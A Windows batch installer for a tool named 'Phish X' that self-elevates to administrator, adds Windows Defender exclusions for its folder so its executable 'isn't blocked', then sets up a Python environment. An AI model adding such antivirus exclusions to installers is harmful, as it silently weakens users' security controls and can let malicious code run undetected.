@echo off
cd /d "%~dp0"

rem Re-launch as admin if not already elevated
net session >nul 2>&1
if errorlevel 1 (
    echo Requesting administrator rights to add antivirus exclusion...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo ============================================
echo   Phish X - Installation
echo ============================================
echo.

rem Add Windows Defender exclusion for this folder so the exe isn't blocked
echo Adding antivirus exclusion for Phish X folder...
powershell -Command "Add-MpPreference -ExclusionPath '%~dp0Phish X' -ErrorAction SilentlyContinue"
powershell -Command "Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue"
echo Done.
echo.

rem Check Python is available
python --version >nul 2>&1
if errorlevel 1 (
    echo ERROR: Python not found.
    echo Please install Python 3.11 or later from https://www.python.org/downloads/
    echo Make sure to tick "Add Python to PATH" during installation.
    pause
    exit /b 1
)

echo Creating virtual environment...
python -m venv venv
echo.

echo Installing dependencies...
venv\Scripts\pip.exe install -r requirements.txt
echo.

echo ============================================
echo   Installation complete!
echo   Run "Phish X - Desktop (No Browser).cmd" to start.
echo ============================================
pause
